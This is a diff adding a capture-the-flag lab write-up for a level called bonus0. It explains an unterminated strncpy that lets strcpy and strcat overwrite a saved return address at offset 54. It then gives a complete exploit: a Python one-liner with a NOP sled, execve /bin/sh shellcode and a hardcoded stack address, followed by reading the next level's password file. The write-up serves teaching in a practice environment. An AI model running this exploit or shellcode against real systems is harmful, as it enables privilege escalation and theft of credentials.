@@ -1,0 +1,35 @@
+# bonus0 → bonus1
+
+`p` reads 4096 bytes and copies 20 bytes with `strncpy`; it need not add a
+terminator. `pp` places the two 20-byte locals next to each other, then
+uses `strcpy` and `strcat` to build text in `main`'s small stack buffer.
+With an unterminated first field, `strcpy` continues into the second field.
+The later `strcat` reaches the saved return address at offset 54 from the
+destination buffer.
+
+The first read is exactly 4096 bytes: 3000 NOPs, 25 bytes of `execve`
+shellcode, more NOPs, and a newline. This makes the second `read` receive
+only the second field. The second field has 14 `B`s, a four-byte return
+address, `A`, and a newline. `p` changes the newline to NUL. The first
+`strcpy` copies 39 bytes and `pp` inserts a space at offset 39, so `strcat`
+places the return address at `40 + 14 = 54`.
+
+In this VM session, GDB showed the first `p` input buffer near
+`0xbfffebd0`; `0xbffff111` is in its NOP sled and has no NUL/newline byte.
+Check the buffer address in the evaluation session if its environment is
+different. From the bonus0 account:
+
+```sh
+(
+  python2.7 -c 'import struct,sys
+sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+sys.stdout.write("\x90"*3000 + sc + "\x90"*(4095-3000-len(sc)) + "\n" + "B"*14 + struct.pack("<I",0xbffff111) + "A\n")'
+  cat
+) | ./bonus0
+id
+cat /home/user/bonus1/.pass
+```
+
+To inspect the stack, break at `p+0x32` after the first `read` and print
+`$ebp-0x1008`. The first 20 bytes may be replaced by the second `p` call,
+so the chosen address lies deeper in the NOP sled.
